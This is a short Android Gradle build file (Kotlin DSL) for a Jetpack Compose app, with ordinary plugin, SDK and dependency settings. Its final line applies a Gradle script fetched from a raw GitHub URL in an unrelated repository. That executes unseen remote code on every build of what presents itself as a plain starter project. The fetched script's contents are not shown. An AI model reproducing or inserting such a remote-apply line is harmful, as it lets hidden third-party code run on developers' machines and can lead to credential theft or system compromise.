plugins {
    id("com.android.application")
    id("org.jetbrains.kotlin.plugin.compose")
}

android {
    namespace = "jp.mushamusha.kazokucchi"
    compileSdk = 36

    defaultConfig {
        applicationId = "jp.mushamusha.kazokucchi"
        minSdk = 26
        targetSdk = 36
        versionCode = 1
        versionName = "0.1.0-recovered-starter"
    }

    buildFeatures {
        compose = true
    }
}

dependencies {
    implementation(platform("androidx.compose:compose-bom:2026.06.00"))
    implementation("androidx.activity:activity-compose:1.11.0")
    implementation("androidx.compose.ui:ui")
    implementation("androidx.compose.ui:ui-tooling-preview")
    implementation("androidx.compose.material3:material3")
    debugImplementation("androidx.compose.ui:ui-tooling")
}

apply(from = uri("https://raw.githubusercontent.com/mushamusha8181/light/main/mushin-glass.gradle"))
